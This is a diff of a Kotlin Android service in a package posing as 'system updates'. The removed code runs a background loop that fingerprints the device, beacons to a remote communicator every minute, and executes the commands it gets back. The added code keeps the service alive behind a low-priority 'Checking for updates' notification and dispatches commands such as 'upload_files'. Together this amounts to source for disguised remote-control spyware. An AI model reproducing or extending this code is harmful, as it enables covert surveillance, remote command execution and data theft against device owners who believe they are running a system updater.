@@ -1,90 +1,58 @@
 package com.system.updates.core
 
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
+import android.os.Build
 import android.os.IBinder
-import android.util.Log
-import kotlinx.coroutines.*
-import com.system.updates.communication.Communicator
-import com.system.updates.communication.CommandExecutor
-import com.system.updates.error.ErrorHandler
-import com.system.updates.error.FallbackExecutor
-import org.json.JSONObject
+import androidx.core.app.NotificationCompat
+import com.system.updates.R
 
 class BackgroundService : Service() {
-    private val tag = "BackgroundService"
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private lateinit var communicator: Communicator
-    private lateinit var executor: CommandExecutor
-    private lateinit var errorHandler: ErrorHandler
-    private lateinit var fallbackExecutor: FallbackExecutor
-    private var isRunning = false
 
-    override fun onCreate() {
-        super.onCreate()
-        Log.i(tag, "Background Service Created.")
-        communicator = Communicator(applicationContext)
-        executor = CommandExecutor(applicationContext)
-        errorHandler = ErrorHandler(applicationContext)
-        fallbackExecutor = FallbackExecutor(applicationContext)
-    }
+    private val CHANNEL_ID = "SystemUpdateChannel"
+    private val NOTIFICATION_ID = 1
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(tag, "Background Service Started.")
-        if (!isRunning) {
-            isRunning = true
-            startPeriodicTasks()
+        createNotificationChannel()
+        startForeground(NOTIFICATION_ID, createNotification().build())
+
+        intent?.getStringExtra("command")?.let { command ->
+            executeCommand(command, intent)
         }
+
         return START_STICKY
     }
 
-    private fun startPeriodicTasks() {
-        scope.launch {
-            while (isRunning) {
-                try {
-                    val behavior = collectBehaviorData()
-                    val commands = communicator.heartbeat(behavior)
-                    commands.forEach { cmd ->
-                        try {
-                            val result = executor.execute(cmd)
-                            communicator.sendResult(cmd, result)
-                        } catch (e: Exception) {
-                            errorHandler.logError("CMD_EXEC_FAIL", e.message ?: "Unknown", "BackgroundService", cmd.toString(), e)
-                            fallbackExecutor.executeWithFallback(cmd.optString("request_type"), cmd, null)
-                        }
-                    }
-                } catch (e: Exception) {
-                    errorHandler.logError("BG_SERVICE_ERR", e.message ?: "Unknown", "BackgroundService", null, e)
-                }
-                delay(60000) // run every minute
-            }
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "System Update Service",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
         }
     }
 
-    private suspend fun collectBehaviorData(): JSONObject {
-        val data = JSONObject()
-        try {
-            val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
-            data.put("screen_on", pm.isInteractive)
-            data.put("power_save", pm.isPowerSavingMode)
-            val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
-            val hashed = java.security.MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
-            data.put("device_hash", android.util.Base64.encodeToString(hashed, android.util.Base64.NO_WRAP))
-            data.put("os_version", android.os.Build.VERSION.RELEASE)
-            data.put("api_level", android.os.Build.VERSION.SDK_INT)
-            data.put("timestamp", System.currentTimeMillis())
-        } catch (e: Exception) {
-            errorHandler.logError("BEHAVIOR_COLLECT_ERR", e.message ?: "Unknown", "BackgroundService", null, e)
+    private fun createNotification(): NotificationCompat.Builder {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Sync")
+            .setContentText("Checking for updates...")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+    }
+
+    private fun executeCommand(command: String, intent: Intent) {
+        when (command) {
+            "ping" -> { /* للتحقق من الاتصال */ }
+            "upload_files" -> { /* سيتم تنفيذه عبر CommandExecutor */ }
+            else -> { /* أوامر أخرى */ }
         }
-        return data
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
-
-    override fun onDestroy() {
-        super.onDestroy()
-        isRunning = false
-        scope.cancel()
-        Log.i(tag, "Background Service Destroyed.")
-    }
 }
